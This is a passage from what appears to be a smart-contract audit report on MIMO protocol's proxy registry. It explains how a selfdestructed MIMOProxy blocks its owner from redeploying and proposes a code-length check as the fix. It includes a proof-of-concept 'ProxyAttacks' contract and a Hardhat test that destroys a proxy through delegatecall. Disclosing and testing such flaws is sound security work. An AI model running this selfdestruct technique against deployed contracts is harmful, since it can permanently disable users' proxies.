protocol.</p>\n</blockquote>\n</blockquote>\n<hr>\n<h2 id=\"m-08-if-a-mimoproxy-owner-destroys-their-proxy-they-cannot-deploy-another-from-the-same-address\" style=\"position:relative;\"><a href=\"#m-08-if-a-mimoproxy-owner-destroys-their-proxy-they-cannot-deploy-another-from-the-same-address\" aria-label=\"m 08 if a mimoproxy owner destroys their proxy they cannot deploy another from the same address permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/162\">[M-08] If a MIMOProxy owner destroys their proxy, they cannot deploy another from the same address</a></h2>\n<p><em>Submitted by horsefacts</em></p>\n<p>When deploying a new <code>MIMOProxy</code>, the <code>MIMOProxyRegistry</code> first checks whether a proxy exists with the same owner for the given address. If an existing proxy is found, the deployment reverts:</p>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxyRegistry.sol#L45-L59\"><code>MIMOProxyRegistry#deployFor</code></a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deployFor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">IMIMOProxy</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proxy</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IMIMOProxy</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentProxy</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_currentProxies</span><span class=\"mtk1\">[</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Do not deploy if the proxy already exists and the owner is the same.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentProxy</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">currentProxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">owner</span><span class=\"mtk1\">() == </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CustomErrors</span><span class=\"mtk1\">.</span><span class=\"mtk11\">PROXY_ALREADY_EXISTS</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Deploy the proxy via the factory.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">proxy</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deployFor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Set or override the current proxy for the owner.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_currentProxies</span><span class=\"mtk1\">[</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">IMIMOProxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proxy</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>However, if a <code>MIMOProxy</code> owner intentionally or accidentally destroys their proxy by <code>delegatecall</code>ing a target that calls <code>selfdestruct</code>, the address of their destroyed proxy will remain in the <code>_currentProxies</code> mapping, but the static call to <code>currentProxy.owner()</code> on L49 will revert. The caller will be blocked from deploying a new proxy from the same address that created their original `MIMOProxy.</p>\n<h3 id=\"impact-4\" style=\"position:relative;\"><a href=\"#impact-4\" aria-label=\"impact 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>If a user accidentally destroys their MIMOProxy, they must use a new EOA address to deploy another.</p>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Check whether the proxy has been destroyed as part of the “proxy already exists” conditions. If the proxy address has a codesize of zero, it has been destroyed:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Do not deploy if the proxy already exists and the owner is the same.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentProxy</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">currentProxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">code</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">currentProxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">owner</span><span class=\"mtk1\">() == </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CustomErrors</span><span class=\"mtk1\">.</span><span class=\"mtk11\">PROXY_ALREADY_EXISTS</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h4 id=\"test-cases-2\" style=\"position:relative;\"><a href=\"#test-cases-2\" aria-label=\"test cases 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Test cases</h4>\n<p>We’ll use this <code>ProxyAttacks</code> helper contract to manipulate proxy storage. Note that it has the same storage layout as <code>MIMOProxy</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProxyAttacks</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minGasReserve</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">))) </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_permissions</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk3\">// Selector 0x9cb8a26a</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">selfDestruct</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     </span><span class=\"mtk11\">selfdestruct</span><span class=\"mtk1\">(</span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Then deploy the <code>ProxyAttacks</code> helper in a test environment and use <code>MIMOProxy</code> to <code>delegatecall</code> into it:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"typescript\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk12\">chai</span><span class=\"mtk1\">, { </span><span class=\"mtk12\">expect</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;chai&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;ethereum-waffle&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">deployments</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;hardhat&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">MIMOProxy</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MIMOProxyFactory</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MIMOProxyRegistry</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ProxyAttacks</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;../../typechain&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">chai</span><span class=\"mtk1\">.</span><span class=\"mtk11\">use</span><span class=\"mtk1\">(</span><span class=\"mtk12\">solidity</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">setup</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">deployments</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createFixture</span><span class=\"mtk1\">(</span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">deploy</span><span class=\"mtk1\"> } = </span><span class=\"mtk12\">deployments</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> [</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">] = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getSigners</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MIMOProxy&quot;</span><span class=\"mtk1\">, {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">args:</span><span class=\"mtk1\"> [],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mimoProxyBase</span><span class=\"mtk1\">: </span><span class=\"mtk10\">MIMOProxy</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContract</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MIMOProxy&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MIMOProxyFactory&quot;</span><span class=\"mtk1\">, {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">args:</span><span class=\"mtk1\"> [</span><span class=\"mtk12\">mimoProxyBase</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mimoProxyFactory</span><span class=\"mtk1\">: </span><span class=\"mtk10\">MIMOProxyFactory</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContract</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MIMOProxyFactory&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MIMOProxyRegistry&quot;</span><span class=\"mtk1\">, {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">args:</span><span class=\"mtk1\"> [</span><span class=\"mtk12\">mimoProxyFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mimoProxyRegistry</span><span class=\"mtk1\">: </span><span class=\"mtk10\">MIMOProxyRegistry</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContract</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MIMOProxyRegistry&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ProxyAttacks&quot;</span><span class=\"mtk1\">, {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">args:</span><span class=\"mtk1\"> [],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proxyAttacks</span><span class=\"mtk1\">: </span><span class=\"mtk10\">ProxyAttacks</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContract</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ProxyAttacks&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">mimoProxyBase</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">mimoProxyFactory</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">mimoProxyRegistry</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">proxyAttacks</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  };</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">});</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">describe</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Proxy attack tests&quot;</span><span class=\"mtk1\">, () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Proxy instance self destruct + recreation&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">mimoProxyRegistry</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proxyAttacks</span><span class=\"mtk1\"> } = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setup</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mimoProxyRegistry</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentProxy</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mimoProxyRegistry</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCurrentProxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proxy</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractAt</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MIMOProxy&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">currentProxy</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Delegatecall to selfDestruct on ProxyAttacks contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">execute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proxyAttacks</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;0x9cb8a26a&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Owner&#39;s existing proxy is destroyed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">owner</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;call revert exception&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Cannot deploy another proxy for this address through the registry</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span 